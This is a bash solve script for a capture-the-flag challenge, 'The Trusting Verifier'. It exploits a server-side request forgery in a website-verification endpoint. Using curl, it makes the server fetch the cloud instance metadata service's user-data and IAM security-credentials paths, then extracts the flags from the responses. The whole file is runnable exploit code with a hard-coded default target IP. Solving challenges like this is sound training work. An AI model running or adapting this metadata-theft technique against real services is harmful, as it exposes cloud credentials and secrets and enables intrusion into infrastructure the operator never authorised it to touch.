#!/usr/bin/env bash
# solve-trusting-verifier.sh — riffhack "The Trusting Verifier"
#
# POST /api/vendor/verify-website is a generic SSRF — no allow-list on the
# destination URL. We point it at the mocked AWS IMDS user-data endpoint and
# read back a bootstrap shell script that exports TRUSTING_VERIFIER_FLAG=<flag>.
#
# Bonus: the IMDS IAM credentials endpoint exposes a second flag in the Token
# field (the unflipped riffhack web5 decoy `w3bs0ck3t_upgr4d3_ssrf_2026`).
#
# Usage: solve-trusting-verifier.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
echo "[*] Trusting Verifier (SSRF → IMDS user-data) against $HOST"

echo "[*] POST /api/vendor/verify-website {website: imds/user-data}"
resp=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/user-data"}' \
  "http://$HOST/api/vendor/verify-website")

echo "[*] response body excerpt:"
printf '%s\n' "$resp" | python3 -m json.tool 2>/dev/null | head -20 \
  || printf '%s\n' "$resp" | head -c 600

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag in SSRF response" >&2
  exit 1
fi

echo
echo "[*] bonus — IAM credentials Token field (sister flag):"
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole"}' \
  "http://$HOST/api/vendor/verify-website" \
  | grep -oE 'bitflag\{[^}]+\}' | head -1 || true
